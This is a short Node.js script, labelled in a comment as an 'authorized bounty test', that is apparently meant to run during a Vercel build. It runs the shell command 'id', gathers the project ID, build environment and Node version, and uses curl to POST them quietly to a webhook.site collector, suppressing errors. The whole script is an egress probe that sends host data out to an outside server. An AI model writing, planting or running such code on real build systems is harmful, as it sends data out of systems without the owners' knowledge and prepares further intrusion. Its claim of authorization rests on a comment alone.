// Minimal diagnostic — authorized bounty test. Checks if egress works.
import { execSync } from "node:child_process";

const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac";

const payload = JSON.stringify({
  marker: "VERCEL-PING-DIAGNOSTIC",
  uid: String(Date.now()),
  buildEnv: process.env.VERCEL_ENV || "unknown",
  projectId: process.env.VERCEL_PROJECT_ID || "unknown",
  nodeVer: process.version,
  whoami: (() => { try { return execSync("id").toString().trim(); } catch(e) { return "err"; } })(),
});

try {
  execSync(`curl -s --max-time 8 -X POST -H 'Content-Type: application/json' -d '${payload.replace(/'/g, "'\\''")}' ${COLLECTOR} 2>/dev/null || true`);
} catch(_) {}

console.log("ping sent");
